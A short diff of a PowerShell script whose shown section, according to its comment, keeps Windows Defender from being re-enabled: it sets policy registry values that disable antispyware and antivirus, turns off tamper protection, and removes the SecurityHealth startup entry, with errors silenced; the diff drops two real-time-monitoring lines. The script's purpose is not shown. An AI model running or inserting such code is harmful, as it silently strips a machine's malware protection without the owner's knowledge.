@@ -193,12 +193,10 @@ foreach ($ifeoName in @(
 
 # 7. Keep the policies that prevent re-enabling the engine.
 New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Force -ErrorAction SilentlyContinue | Out-Null
-New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Force -ErrorAction SilentlyContinue | Out-Null
 New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' -Force -ErrorAction SilentlyContinue | Out-Null
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Force -ErrorAction SilentlyContinue | Out-Null
 Set-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiVirus' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
-Set-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' -Name 'SubmitSamplesConsent' -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
 Set-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name 'TamperProtection' -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
 Remove-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'SecurityHealth' -Force -ErrorAction SilentlyContinue
